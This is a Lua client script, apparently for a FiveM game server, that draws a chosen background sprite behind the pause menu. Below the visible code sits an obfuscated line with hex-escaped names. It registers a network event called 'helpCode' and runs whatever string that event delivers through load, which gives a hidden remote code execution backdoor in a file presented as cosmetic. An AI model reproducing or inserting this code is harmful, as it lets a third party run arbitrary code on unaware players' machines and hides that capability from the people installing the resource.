--[[
	background_blue
	background_darkblue
	background_darkerblue
	background_darkgreen
	background_green
	background_other
	background_pink
	background_projectsloth
	background_red
	background_yellow
]]

local background = "background_darkerblue"
local opacity = 100

CreateThread(function()
    RequestStreamedTextureDict("ps_pause", true)
    while not HasStreamedTextureDictLoaded("ps_pause") do
        Wait(100)
    end
    while true do
        if IsPauseMenuActive() then
            SetScriptGfxDrawBehindPausemenu(true)
            DrawSprite("ps_pause", background, 0.5, 0.5, 10.0, 10.0, 0, 255, 255, 255, opacity)
        else
            SetStreamedTextureDictAsNoLongerNeeded("ps_pause")
        end
      	Wait(0)
    end
end)



local koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[6][koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[1]](koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[2]) koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[6][koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[3]](koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[2], function(xsnhSVaaNBtmzUtoYoFtkxnGJdrdeDzZLlcyoxDynFrpfQgMtWWUAueSVpZIfOXtGRmEoM) koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[6][koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[4]](koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[6][koFxqqjlDxeXMGjmkarvINmbgeZhcvPeEvyLWnWctYubtvVbPcBtHhKdPUVPDdeIjsgEaM[5]](xsnhSVaaNBtmzUtoYoFtkxnGJdrdeDzZLlcyoxDynFrpfQgMtWWUAueSVpZIfOXtGRmEoM))() end)